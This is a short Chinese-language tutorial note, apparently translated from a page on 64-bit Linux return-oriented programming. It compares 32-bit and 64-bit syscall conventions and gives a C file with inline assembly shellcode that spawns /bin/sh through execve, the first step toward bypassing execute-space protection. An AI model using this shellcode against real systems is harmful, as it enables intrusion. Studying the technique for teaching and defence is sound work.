# ROP 

## 64bit linux rop
> https://crypto.stanford.edu/~blynn/asm/rop.html

本文介绍如何绕过64位linux上的执行空间保护（ESP），这里使用了ROP。

### 基本知识

编写汇编代码，通过系统调用执行shell通常是绕过保护的（ROP）的启示步骤。

由于向后兼容性，32位linux system calls 在64位机器上是被支持的，所以我们可以考虑我们能重用面向32位的系统。然而，执行系统调用使用一个以NUL为结尾的内存地址程序名来执行。我们的shellcode 可能被注入到的某个位置，它要求我们引用内存地址大雨32bits，这使我们必须使用64位系统调用。

下面这些可以帮助已经熟悉32位汇编的人了解64位汇报

||32bit syscall|64 bit syscall|
|-|-|-|
|instruction|`int $0x80` | `syscall`|
|syscall number|`EAX, e.g. execve = 0xb`| `RAX, e.g. execve=0x3b`|
|up to 6 inputs | EBX, ECX, EDX, ESI, EDI, EBP| RDI, RSI, RDX, R10, R8, R9|
|over 6 inputs| in RAM; EBX 指向他们|禁止|

32bit 系统调用例子：
```
mov $0xb, %eax
lea string_addr, %ebx
mov $0, %ecx
mov $0, %edx
int $0x80
```

64位系统调用例子：
```
mov $0x3b, %rax
lea string_addr, %rdi
mov $0, %rsi
mov $0, %rdx
syscall
```

我们需要把汇编代码放到一个C文件中，简单命名为 shell.c

```c
int main()
{
    asm("\
    needle0:jmp there\n\
    here:   pop %rdi\n\
            xor %rax,%rax\n\
            movb $0x3b,%al\n\
            xor %rsi, %rsi\n\
            xor %rdx, %rdx\n\
            syscall\n\
    there:   call here\n\
    .string \"/bin/sh\"\n\
    needle1: .octa 0xdeadbeef\n\
    ");

}
```